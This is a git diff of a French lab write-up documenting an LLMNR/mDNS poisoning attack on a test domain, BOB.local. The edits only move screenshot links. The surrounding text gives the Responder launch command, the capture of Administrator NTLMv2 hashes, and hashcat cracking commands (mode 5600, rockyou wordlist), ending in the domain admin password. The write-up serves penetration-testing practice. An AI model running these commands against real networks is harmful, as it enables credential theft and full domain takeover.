@@ -20,18 +20,19 @@ ip a
 Interface retenue : `eth0` (192.168.10.250)
 
 ### 2. Lancement de Responder
-*(capture d'écran : `../../screenshots/02-credential-capture/01.png`)*
 
 ```
 sudo responder -I eth0
 ```
-*(capture d'écran : `../../screenshots/02-credential-capture/02.png`)*
+*(capture d'écran : `../../screenshots/02-credential-capture/01.png`)*
 
 
 ### 3. Déclenchement de la requête côté victime
 Sur la machine Windows, tentative de résolution d'un partage inexistant :
 
 ### 4. Capture du hash NTLMv2
+*(capture d'écran : `../../screenshots/02-credential-capture/02.png`)*
+
 Responder intercepte la requête LLMNR/mDNS et capture plusieurs hashs NTLMv2 pour le compte `Administrator` (un nouveau hash à chaque tentative, car le challenge change).
 ## Résultat
 Ce qu'on obtient à l'issue de l'attaque (hash, ticket, accès, credentials...).
@@ -43,7 +44,7 @@ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/
 hashcat -m 5600 hash.txt passlist.txt (mon propre liste)
 hashcat -m 5600 hash.txt --show
 ```
-
+*(capture d'écran : `../../screenshots/02-credential-capture/03.png`)*
 ## Résultat
 Obtention du mot de passe en clair du compte `Administrator` du domaine `BOB.local` — accès complet aux privilèges administratifs du domaine, sans jamais avoir eu d'identifiant de départ.
 
